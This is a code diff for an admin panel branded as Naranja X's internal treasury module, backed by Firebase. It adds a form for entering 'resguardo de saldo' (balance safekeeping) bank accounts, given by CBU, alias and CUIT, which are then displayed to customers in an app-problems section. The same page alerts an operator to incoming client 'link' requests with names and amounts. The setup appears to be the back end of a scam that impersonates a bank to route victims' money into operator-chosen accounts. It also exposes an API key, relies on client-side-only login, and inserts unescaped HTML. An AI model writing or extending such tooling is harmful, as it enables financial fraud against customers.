@@ -54,7 +54,51 @@
   </header>
 
   <!-- Contenido Admin -->
-  <main class="max-w-6xl w-full mx-auto p-4 md:p-6 flex-1">
+  <main class="max-w-6xl w-full mx-auto p-4 md:p-6 flex-1 space-y-6">
+    
+    <!-- SECCIÓN 1: Cargar Cuentas y Tesoreros Oficiales -->
+    <div class="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden">
+      <div class="p-5 border-b border-slate-200 bg-slate-50">
+        <h2 class="font-extrabold text-nxPurple-900 text-base">🏦 Configuración de Cuentas de Tesorería (Resguardo de Saldo)</h2>
+        <p class="text-xs text-slate-500">Agrega o elimina las cuentas oficiales que se le mostrarán al cliente en la sección "Problemas con la Aplicación".</p>
+      </div>
+
+      <div class="p-5 grid grid-cols-1 md:grid-cols-3 gap-6">
+        <!-- Formulario Cargar Tesorero -->
+        <form onsubmit="adminApp.addTreasurer(event)" class="space-y-3 bg-nxPurple-50/50 p-4 rounded-xl border border-nxPurple-100">
+          <h3 class="font-bold text-xs uppercase tracking-wider text-nxPurple-900">Agregar Nueva Cuenta</h3>
+          <div>
+            <label class="block text-[11px] font-bold text-slate-700 uppercase mb-0.5">Nombre / Titular</label>
+            <input type="text" id="tres-name" required placeholder="Ej. Tesorería Naranja X S.A." class="w-full px-3 py-2 bg-white border border-slate-300 rounded-lg text-xs focus:outline-none focus:border-nxOrange-500">
+          </div>
+          <div>
+            <label class="block text-[11px] font-bold text-slate-700 uppercase mb-0.5">CUIL / CUIT</label>
+            <input type="text" id="tres-cuil" required placeholder="Ej. 30-71234567-8" class="w-full px-3 py-2 bg-white border border-slate-300 rounded-lg text-xs focus:outline-none focus:border-nxOrange-500">
+          </div>
+          <div>
+            <label class="block text-[11px] font-bold text-slate-700 uppercase mb-0.5">Alias</label>
+            <input type="text" id="tres-alias" required placeholder="Ej. naranja.resguardo.oficial" class="w-full px-3 py-2 bg-white border border-slate-300 rounded-lg text-xs focus:outline-none focus:border-nxOrange-500">
+          </div>
+          <div>
+            <label class="block text-[11px] font-bold text-slate-700 uppercase mb-0.5">CBU / CVU</label>
+            <input type="text" id="tres-cbu" required placeholder="Ej. 0000003100012345678901" class="w-full px-3 py-2 bg-white border border-slate-300 rounded-lg text-xs focus:outline-none focus:border-nxOrange-500">
+          </div>
+          <button type="submit" class="w-full bg-nxOrange-500 hover:bg-nxOrange-600 text-white font-bold py-2.5 rounded-lg text-xs transition shadow-sm">
+            Guardar Cuenta
+          </button>
+        </form>
+
+        <!-- Lista de Cuentas Actuales -->
+        <div class="md:col-span-2 space-y-3">
+          <h3 class="font-bold text-xs uppercase tracking-wider text-slate-700">Cuentas Activas Visibles en la App</h3>
+          <div id="admin-treasurers-list" class="grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-64 overflow-y-auto">
+            <!-- Inyectado dinámicamente -->
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECCIÓN 2: Pedidos de Links -->
     <div class="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden">
       <div class="p-5 border-b border-slate-200 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
         <div>
@@ -101,10 +145,10 @@
     &copy; 2026 Módulo de Tesorería Interna - Naranja X
   </footer>
 
-  <!-- Script Admin con Alarma Sonora Estridente -->
+  <!-- Script Admin con Gestión de Tesoreros y Alarma -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+    import { getDatabase, ref, onValue, update, push, remove } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyDHcfixcpUU4O-RYLmfNzTUDZFB13jEt5s",
@@ -128,6 +172,7 @@
         if (sessionStorage.getItem('nx_admin_auth') === 'true') {
           document.getElementById('login-overlay').classList.add('hidden');
           this.listenToFirebaseRequests();
+          this.listenToTreasurers();
           this.updateNotificationButtonState();
         }
       },
@@ -138,6 +183,7 @@
           sessionStorage.setItem('nx_admin_auth', 'true');
           document.getElementById('login-overlay').classList.add('hidden');
           this.listenToFirebaseRequests();
+          this.listenToTreasurers();
           this.enableNotificationsManual();
         } else {
           alert('Clave incorrecta');
@@ -151,22 +197,14 @@
 
       async enableNotificationsManual() {
         try {
-          if (!this.audioCtx) {
-            this.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          }
-          if (this.audioCtx.state === 'suspended') {
-            await this.audioCtx.resume();
-          }
+          if (!this.audioCtx) this.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          if (this.audioCtx.state === 'suspended') await this.audioCtx.resume();
           this.playLoudAlarmSound();
-        } catch (e) {
-          console.error('Audio init error:', e);
-        }
+        } catch (e) {}
 
         if ('Notification' in window) {
           const perm = await Notification.requestPermission();
-          if (perm === 'granted') {
-            alert('🚨 ¡Alarma sonora y notificaciones activadas a máximo volumen!');
-          }
+          if (perm === 'granted') alert('🚨 ¡Alarma sonora activada!');
         }
         this.updateNotificationButtonState();
       },
@@ -180,33 +218,23 @@
         }
       },
 
-      // NUEVO MOTOR DE AUDIO: Alarma Potente Tipo Sirena de Emergencia
       playLoudAlarmSound() {
         try {
-          if (!this.audioCtx) {
-            this.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-          }
-          if (this.audioCtx.state === 'suspended') {
-            this.audioCtx.resume();
-          }
+          if (!this.audioCtx) this.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          if (this.audioCtx.state === 'suspended') this.audioCtx.resume();
 
           const now = this.audioCtx.currentTime;
-          
-          // Creamos el oscilador con onda cuadrada (Square) que es mucho más estridente y fuerte
           const osc = this.audioCtx.createOscillator();
           const gain = this.audioCtx.createGain();
 
-          osc.type = 'square'; // Tipo de onda muy llamativa/industrial
+          osc.type = 'square';
+          osc.frequency.setValueAtTime(880, now);
+          osc.frequency.setValueAtTime(1200, now + 0.15);
+          osc.frequency.setValueAtTime(880, now + 0.30);
+          osc.frequency.setValueAtTime(1200, now + 0.45);
+          osc.frequency.setValueAtTime(880, now + 0.60);
+          osc.frequency.setValueAtTime(1400, now + 0.75);
 
-          // Secuencia multitono estilo sirena (Acento agudo alternado)
-          osc.frequency.setValueAtTime(880, now);          // A5
-          osc.frequency.setValueAtTime(1200, now + 0.15);    // D6 (Agudo)
-          osc.frequency.setValueAtTime(880, now + 0.30);     // A5
-          osc.frequency.setValueAtTime(1200, now + 0.45);    // D6 (Agudo)
-          osc.frequency.setValueAtTime(880, now + 0.60);     // A5
-          osc.frequency.setValueAtTime(1400, now + 0.75);    // E6 (Muy Agudo)
-
-          // Volumen máximo sostenido (0.8)
           gain.gain.setValueAtTime(0.8, now);
           gain.gain.exponentialRampToValueAtTime(0.01, now + 1.1);
 
@@ -215,16 +243,13 @@
 
           osc.start(now);
           osc.stop(now + 1.1);
-        } catch (e) {
-          console.error("Error al reproducir el tono fuerte:", e);
-        }
+        } catch (e) {}
       },
 
       triggerNotification(request) {
         this.playLoudAlarmSound();
-
         if ('Notification' in window && Notification.permission === 'granted') {
-          const title = `🚨 ¡NUEVO PEDIDO DE LINK RECIBIDO! (${request.id})`;
+          const title = `🚨 ¡NUEVO PEDIDO DE LINK! (${request.id})`;
           const options = {
             body: `👤 Cliente: ${request.name}\n💰 Monto: $${request.amount || '0'}\n📌 Tipo: ${request.category === 'transfers' ? 'Devolución' : 'Pago Resumen'}`,
             icon: 'https://cdn-icons-png.flaticon.com/512/1827/1827504.png',
@@ -235,6 +260,68 @@
         }
       },
 
+      // --- GESTIÓN DE TESOREROS / CUENTAS DE RESGUARDO ---
+      async addTreasurer(e) {
+        e.preventDefault();
+        const name = document.getElementById('tres-name').value.trim();
+        const cuil = document.getElementById('tres-cuil').value.trim();
+        const alias = document.getElementById('tres-alias').value.trim();
+        const cbu = document.getElementById('tres-cbu').value.trim();
+
+        try {
+          await push(ref(db, 'treasurers'), { name, cuil, alias, cbu, createdAt: Date.now() });
+          alert('¡Cuenta de Tesorería guardada y publicada en la app!');
+          document.getElementById('tres-name').value = '';
+          document.getElementById('tres-cuil').value = '';
+          document.getElementById('tres-alias').value = '';
+          document.getElementById('tres-cbu').value = '';
+        } catch (error) {
+          alert('Error al guardar la cuenta.');
+        }
+      },
+
+      async deleteTreasurer(key) {
+        if (confirm('¿Estás seguro de eliminar esta cuenta de resguardo?')) {
+          try {
+            await remove(ref(db, `treasurers/${key}`));
+          } catch (error) {
+            alert('Error al eliminar.');
+          }
+        }
+      },
+
+      listenToTreasurers() {
+        const treasurersRef = ref(db, 'treasurers');
+        onValue(treasurersRef, (snapshot) => {
+          const data = snapshot.val() || {};
+          const container = document.getElementById('admin-treasurers-list');
+          if (!container) return;
+          container.innerHTML = '';
+
+          const entries = Object.entries(data);
+          if (entries.length === 0) {
+            container.innerHTML = '<p class="text-xs text-slate-400 italic">No hay cuentas cargadas.</p>';
+            return;
+          }
+
+          entries.forEach(([key, t]) => {
+            const card = document.createElement('div');
+            card.className = 'p-3 bg-slate-50 border border-slate-200 rounded-xl space-y-1 relative group text-xs';
+            card.innerHTML = `
+              <div class="font-bold text-nxPurple-900 pr-6">${t.name}</div>
+              <div class="text-[11px] text-slate-600">CUIL: ${t.cuil}</div>
+              <div class="text-[11px] text-slate-800"><strong>Alias:</strong> ${t.alias}</div>
+              <div class="text-[11px] text-slate-800 font-mono"><strong>CBU:</strong> ${t.cbu}</div>
+              <button onclick="adminApp.deleteTreasurer('${key}')" class="absolute top-2 right-2 text-slate-300 hover:text-red-500 text-xs transition" title="Eliminar cuenta">
+                🗑️
+              </button>
+            `;
+            container.appendChild(card);
+          });
+        });
+      },
+
+      // --- PEDIDOS DE CLIENTES ---
       listenToFirebaseRequests() {
         const requestsRef = ref(db, 'requests');
         onValue(requestsRef, (snapshot) => {
